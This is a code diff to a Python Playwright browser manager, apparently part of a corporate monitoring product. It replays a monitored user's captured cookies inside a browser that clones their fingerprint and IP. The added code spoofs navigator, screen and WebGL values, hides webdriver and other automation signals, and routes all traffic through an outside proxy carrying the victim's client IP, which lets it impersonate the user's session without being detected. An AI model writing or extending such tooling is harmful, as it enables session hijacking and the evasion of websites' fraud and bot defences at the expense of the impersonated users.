@@ -75,10 +75,14 @@ class BrowserManager:
             machine_id = incident.get("machine_id")
             target_url = incident.get("tab_url")
             cookies_raw = incident.get("full_cookie_data", [])
+            fingerprint = incident.get("browser_fingerprint", {})
+            client_ip = incident.get("client_ip")
             
             print(f"[BrowserManager] Iniciando sessão para incidente {incident_id}")
             print(f"[BrowserManager] URL: {target_url}")
             print(f"[BrowserManager] Cookies: {len(cookies_raw)} cookies")
+            print(f"[BrowserManager] Fingerprint disponível: {bool(fingerprint)}")
+            print(f"[BrowserManager] Client IP: {client_ip or 'Não disponível'}")
             
             # Iniciar browser Chromium (sempre novo processo se interativo)
             if interactive:
@@ -103,14 +107,96 @@ class BrowserManager:
             
             print(f"[BrowserManager] ✓ Browser inicializado")
             
-            # Criar contexto com configurações
-            context = await browser.new_context(
-                viewport={'width': 1280, 'height': 720},
-                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                ignore_https_errors=True,
-                java_script_enabled=True
-            )
-            print(f"[BrowserManager] ✓ Contexto criado (viewport: 1280x720)")
+            # Configurar contexto com fingerprint completo
+            context_options = {
+                'ignore_https_errors': True,
+                'java_script_enabled': True
+            }
+            
+            # Aplicar Screen Properties do fingerprint
+            if fingerprint.get('screen'):
+                screen = fingerprint['screen']
+                context_options['viewport'] = {
+                    'width': screen.get('width', 1920),
+                    'height': screen.get('height', 1080)
+                }
+                context_options['device_scale_factor'] = screen.get('pixelRatio', 1)
+                print(f"[BrowserManager] ✓ Viewport: {screen.get('width')}x{screen.get('height')} @ {screen.get('pixelRatio')}x")
+            else:
+                context_options['viewport'] = {'width': 1280, 'height': 720}
+                print(f"[BrowserManager] ⚠️ Usando viewport padrão (1280x720)")
+            
+            # Aplicar User Agent
+            if fingerprint.get('userAgent'):
+                context_options['user_agent'] = fingerprint['userAgent']
+                print(f"[BrowserManager] ✓ User Agent: {fingerprint['userAgent'][:60]}...")
+            else:
+                context_options['user_agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                print(f"[BrowserManager] ⚠️ Usando User Agent padrão")
+            
+            # Aplicar Timezone
+            if fingerprint.get('timezone'):
+                tz_name = fingerprint['timezone'].get('name', 'America/Sao_Paulo')
+                context_options['timezone_id'] = tz_name
+                langs = fingerprint.get('languages', {})
+                context_options['locale'] = langs.get('language', 'pt-BR')
+                print(f"[BrowserManager] ✓ Timezone: {tz_name}, Locale: {context_options['locale']}")
+            
+            # Criar contexto com todas as configurações
+            context = await browser.new_context(**context_options)
+            print(f"[BrowserManager] ✓ Contexto criado com fingerprint")
+            
+            # Injetar scripts para sobrescrever propriedades não-padrão
+            if fingerprint:
+                await self._inject_fingerprint_overrides(context, fingerprint)
+            
+            # Configurar túnel DNS se client_ip disponível
+            if client_ip and incident_id:
+                print(f"[BrowserManager] Configurando túnel DNS via site-proxy...")
+                
+                async def route_handler(route):
+                    """Proxy via site-proxy com client_ip"""
+                    request = route.request
+                    url = request.url
+                    
+                    # Ignorar requisições internas do browser
+                    if url.startswith('data:') or url.startswith('blob:'):
+                        await route.continue_()
+                        return
+                    
+                    proxy_url = "https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/site-proxy"
+                    
+                    payload = {
+                        "url": url,
+                        "incidentId": incident_id,
+                        "clientIp": client_ip,
+                        "rawContent": True
+                    }
+                    
+                    try:
+                        import aiohttp
+                        async with aiohttp.ClientSession() as session:
+                            async with session.post(proxy_url, json=payload, timeout=aiohttp.ClientTimeout(total=30)) as response:
+                                content = await response.read()
+                                headers = dict(response.headers)
+                                
+                                # Filtrar headers problemáticos
+                                headers.pop('content-encoding', None)
+                                headers.pop('transfer-encoding', None)
+                                
+                                await route.fulfill(
+                                    status=response.status,
+                                    headers=headers,
+                                    body=content
+                                )
+                    except Exception as e:
+                        print(f"[BrowserManager] ⚠️ Erro no túnel DNS para {url[:100]}: {e}")
+                        await route.continue_()
+                
+                await context.route("**/*", route_handler)
+                print(f"[BrowserManager] ✓ Túnel DNS configurado (IP: {client_ip})")
+            else:
+                print(f"[BrowserManager] ⚠️ Navegação sem túnel DNS (client_ip não disponível)")
             
             # Injetar cookies
             if cookies_raw:
@@ -197,6 +283,108 @@ class BrowserManager:
             import traceback
             traceback.print_exc()
             return None
+    
+    async def _inject_fingerprint_overrides(self, context: BrowserContext, fingerprint: Dict):
+        """Injetar scripts para sobrescrever propriedades do navigator/window"""
+        try:
+            # Extrair dados do fingerprint com segurança
+            platform = fingerprint.get("platform", "Win32")
+            vendor = fingerprint.get("vendor", "Google Inc.")
+            hardware = fingerprint.get("hardware", {})
+            screen = fingerprint.get("screen", {})
+            webgl = fingerprint.get("webgl", {})
+            
+            # Construir script de override
+            script = f"""
+            // Override navigator properties
+            Object.defineProperty(navigator, 'platform', {{
+                get: () => '{platform}'
+            }});
+            
+            Object.defineProperty(navigator, 'vendor', {{
+                get: () => '{vendor}'
+            }});
+            
+            Object.defineProperty(navigator, 'hardwareConcurrency', {{
+                get: () => {hardware.get("hardwareConcurrency", 8)}
+            }});
+            
+            Object.defineProperty(navigator, 'deviceMemory', {{
+                get: () => {hardware.get("deviceMemory", 8)}
+            }});
+            
+            Object.defineProperty(navigator, 'maxTouchPoints', {{
+                get: () => {hardware.get("maxTouchPoints", 0)}
+            }});
+            
+            // Override screen properties
+            Object.defineProperty(screen, 'colorDepth', {{
+                get: () => {screen.get("colorDepth", 24)}
+            }});
+            
+            Object.defineProperty(screen, 'pixelDepth', {{
+                get: () => {screen.get("pixelDepth", 24)}
+            }});
+            """
+            
+            # Adicionar override de WebGL se disponível
+            if webgl.get('vendor') and webgl.get('renderer'):
+                vendor_escaped = webgl.get('vendor', '').replace("'", "\\'")
+                renderer_escaped = webgl.get('renderer', '').replace("'", "\\'")
+                
+                script += f"""
+            // Override WebGL properties
+            const getParameter = WebGLRenderingContext.prototype.getParameter;
+            WebGLRenderingContext.prototype.getParameter = function(param) {{
+                if (param === 0x1F00) return '{vendor_escaped}';
+                if (param === 0x1F01) return '{renderer_escaped}';
+                if (param === 0x9245) {{
+                    const ext = this.getExtension('WEBGL_debug_renderer_info');
+                    if (ext && param === ext.UNMASKED_VENDOR_WEBGL) return '{vendor_escaped}';
+                }}
+                if (param === 0x9246) {{
+                    const ext = this.getExtension('WEBGL_debug_renderer_info');
+                    if (ext && param === ext.UNMASKED_RENDERER_WEBGL) return '{renderer_escaped}';
+                }}
+                return getParameter.apply(this, arguments);
+            }};
+            
+            // Aplicar também para WebGL2
+            if (typeof WebGL2RenderingContext !== 'undefined') {{
+                const getParameter2 = WebGL2RenderingContext.prototype.getParameter;
+                WebGL2RenderingContext.prototype.getParameter = function(param) {{
+                    if (param === 0x1F00) return '{vendor_escaped}';
+                    if (param === 0x1F01) return '{renderer_escaped}';
+                    return getParameter2.apply(this, arguments);
+                }};
+            }}
+            """
+            
+            # Remover sinais de automação
+            script += """
+            // Remove sinais de automação
+            delete navigator.webdriver;
+            Object.defineProperty(navigator, 'webdriver', {
+                get: () => undefined
+            });
+            
+            // Sobrescrever chrome.runtime
+            if (window.chrome && window.chrome.runtime) {
+                Object.defineProperty(window.chrome, 'runtime', {
+                    get: () => undefined
+                });
+            }
+            
+            console.log('[CorpMonitor] ✓ Fingerprint overrides aplicados');
+            """
+            
+            await context.add_init_script(script)
+            print(f"[BrowserManager] ✓ Fingerprint overrides injetados")
+            
+        except Exception as e:
+            print(f"[BrowserManager] ⚠️ Erro ao injetar fingerprint overrides: {e}")
+            import traceback
+            traceback.print_exc()
     
     async def _apply_domain_blocks(self, context: BrowserContext):
         """Aplicar bloqueios de domínios ativos"""
